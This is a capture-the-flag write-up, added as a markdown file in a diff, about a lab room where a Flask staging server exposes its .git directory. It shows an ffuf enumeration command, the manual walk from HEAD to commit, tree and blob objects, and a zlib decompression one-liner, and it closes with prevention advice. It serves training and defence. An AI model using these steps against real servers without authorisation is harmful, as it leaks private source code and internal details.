@@ -1,0 +1,156 @@
+---
+title: "Room 404 — Git Repository Exposure via an Unprotected .git Directory"
+room: Byte Lotus — Room 404
+difficulty: easy
+platform: TryHackMe
+vulnClass: "Information Disclosure, Exposed Version Control Directory (.git), Directory Enumeration with ffuf"
+spoilerFree: false
+---
+
+## Observation
+
+> "He booked the quiet room. It's not on the floor plan, not in the brochure, not on any door. But port 8080 is wide open..."
+
+This is an exploratory room. The server runs **Python / Werkzeug** (Flask) on port 8080, and the developer who worked the night shift committed more than just the site itself.
+
+Target: `10.10.10.10:8080`. Concept: git repository exposure (`.git` directory disclosure).
+
+- The main page (`/`) is a Byte Lotus hotel site.
+- In the footer: **"guest experience platform · build staging"**.
+- Server header: `Werkzeug/3.0.1 Python/3.12.3`.
+- There is a `/booking` link that returns 404.
+
+## Action
+
+### 1. Directory enumeration
+
+I used **ffuf** with the wordlist `/usr/share/wordlists/dirb/common.txt`:
+
+```bash
+ffuf -u http://10.10.10.10:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50 -mc 200
+```
+
+The only hit:
+
+```
+.git/HEAD  [Status: 200, Size: 21]
+```
+
+### 2. Extracting the git objects
+
+**`.git/HEAD`** contains:
+
+```
+ref: refs/heads/main
+```
+
+**The ref:**
+
+```
+http://10.10.10.10:8080/.git/refs/heads/main
+→ 0f13550b4cb13e9f30c61d5b342c532d21e45bda
+```
+
+That is the **commit SHA**.
+
+### 3. Downloading the commit object
+
+The path:
+
+```
+.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda
+```
+
+Decompress zlib:
+
+```bash
+python3 -c "import zlib; print(zlib.decompress(open('commit.obj','rb').read()).decode())"
+```
+
+**Output:**
+
+```
+commit 208
+tree fa45dbd69394ea9e13683d9efb6a0220daac59d4
+author night-shift <dev@byte-lotus.internal> 1762049640 +0000
+committer night-shift <dev@byte-lotus.internal> 1762049640 +0000
+
+initial Byte Lotus guest platform
+```
+
+This commit is the first (and only) commit in the repo, and it points to a **tree**.
+
+### 4. Downloading the tree object
+
+The path:
+
+```
+.git/objects/fa/45dbd69394ea9e13683d9efb6a0220daac59d4
+```
+
+Decompress zlib, and I got:
+
+```
+100644 a5965c58... README.md
+100644 2575ab07... app.js
+100644 0a12caa4... index.html
+```
+
+There are **3 files** in the repo.
+
+### 5. Downloading every blob (the files)
+
+- `README.md` → `a5965c580fee91d852e5b19a8290da02d2926523`
+- `app.js` → `2575ab073f67615a27135663ed36794c2d2584fb`
+- `index.html` → `0a12caa4e52a965e89e5eccf5760924b21aacbf7`
+
+Each file follows the same pattern:
+
+```
+.git/objects/XX/XXXX...
+```
+
+### 6. The flag
+
+In **`README.md`**:
+
+```markdown
+# Byte Lotus — Guest Experience Platform
+
+Internal staging repository for the guest app and concierge personalization
+service. Do not deploy this folder to production.
+```
+
+The staging flag line was withheld from publication: `[FLAG CAPTURED]`.
+
+## Result
+
+| Step | What happened |
+|:---|:---|
+| ① | Discovered the server is a **Flask staging** deployment |
+| ② | **ffuf** found `.git/HEAD` |
+| ③ | Extracted the commit object |
+| ④ | Got the tree from the commit |
+| ⑤ | Learned the file names from the tree |
+| ⑥ | Downloaded every blob and decompressed it |
+| ⑦ | The flag was in **README.md** |
+
+The entire application source was reconstructed from raw git objects, with no authentication at any point.
+
+## Takeaway
+
+**The vulnerability:** information disclosure via `.git` directory exposure. The server serves the whole `.git/` directory with no protection. Any visitor can rebuild the full source code from the git objects, and in this case the commit metadata also leaked the developer's internal address `dev@byte-lotus.internal`.
+
+**Why it is so cheap to exploit:** the objects are stored as loose files under predictable paths, and each SHA-1 is half a directory name and half a filename. There is no API to query, no authentication, and no rate limiting — a single `ffuf` sweep with a common wordlist found it, then it was a deterministic walk down the object graph: `HEAD` → ref → commit → tree → blobs.
+
+**Prevention:**
+- Add `.git/` to `.htaccess` or the web server rules:
+  ```
+  RedirectMatch 404 /\.git
+  ```
+- Do not run `python app.py --host=0.0.0.0` in staging without a reverse proxy in front of it.
+
+### Notes
+
+- Room: Hacker Holidays · Byte Lotus Series · Room 404. Difficulty: Very Easy. Category: Web.
+- Date: July 2026.
